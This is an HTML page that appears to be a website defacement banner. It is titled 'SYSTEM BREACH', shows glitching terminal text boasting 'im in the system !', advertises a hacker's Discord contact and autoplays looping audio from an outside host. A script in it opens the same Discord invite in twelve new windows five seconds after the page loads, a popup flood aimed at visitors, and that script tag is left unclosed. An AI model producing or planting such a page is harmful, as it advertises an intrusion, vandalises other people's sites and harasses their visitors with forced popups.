<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM BREACH</title>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        
        
        body {
            background-color: #000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: 'Share Tech Mono', monospace;
        }
        
        .terminal {
            border: 4px solid #fff;
            padding: 40px;
            width: 80%;
            max-width: 800px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
            background-color: rgba(0, 0, 0, 0.7);
        }
        
        .command {
            font-size: 2.5rem;
            font-weight: bold;
            color: #fff;
            margin: 30px 0;
            white-space: pre-wrap;
            text-shadow: 0 0 10px #fff;
            position: relative;
            opacity: 0;
            overflow: hidden;
        }
        
        .command-1 {
            animation: 
                type 1.5s steps(40, end) 0.3s forwards,
                blink-caret 0.5s step-end infinite 0.3s;
        }
        
        .command-2 {
            animation: 
                type 1.5s steps(40, end) 2s forwards,
                blink-caret 0.5s step-end infinite 2s;
        }
        
        @keyframes type {
            from { width: 0; opacity: 1; }
            to { width: 100%; opacity: 1; }
        }
        
        @keyframes blink-caret {
            from, to { border-right-color: transparent }
            50% { border-right-color: #fff; }
        }
        
        .hack-effect {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                rgba(255, 255, 255, 0.1) 0.1em,
                transparent 0.1em
            );
            background-size: 100% 0.2em;
            pointer-events: none;
            animation: scan 4s linear infinite;
            z-index: -1;
        }
        
        @keyframes scan {
            from { transform: translateY(-100%); }
            to { transform: translateY(100%); }
        }
        
        .glitch {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: cover;
            opacity: 0.2;
            z-index: -2;
            animation: glitch 0.8s linear infinite;
        }
        
        @keyframes glitch {
            0% { transform: translate(0); filter: hue-rotate(0deg); }
            20% { transform: translate(-3px, 3px); filter: hue-rotate(60deg); }
            40% { transform: translate(-3px, -3px); filter: hue-rotate(120deg); }
            60% { transform: translate(3px, 3px); filter: hue-rotate(240deg); }
            80% { transform: translate(3px, -3px); filter: hue-rotate(300deg); }
            100% { transform: translate(0); filter: hue-rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="glitch"></div>
    <div class="hack-effect"></div>
    
    <div class="terminal">
        <div class="command command-1">weednetwork@server:~$ im in the system !</div>
        <div class="command command-2">0xLqNz: discord.gg/telnet للتواصل </div>
    </div>
    <audio autoplay loop>
          <source src="https://audio.jukehost.co.uk/qjCAXmStVRTkXxnHYsJFpdpmdZjlG37X" type="audio/mpeg">
          Your browser does not support the audio element.
      </audio>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Random glitch effects
            setInterval(() => {
                const commands = document.querySelectorAll('.command');
                commands.forEach(cmd => {
                    if(Math.random() > 0.8) {
                        cmd.style.textShadow = `0 0 15px hsl(${Math.random()*360}, 100%, 50%)`;
                        setTimeout(() => {
                            cmd.style.textShadow = '0 0 10px #fff';
                        }, 100);
                    }
                });
            }, 150);
        });
    </script>
    <script type="text/javascript">
              window.onload = function() {
                  setTimeout(function() {
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                      window.open('https://discord.gg/P2L','_blank');
                  }, 5000);
              }
</body>
</html>
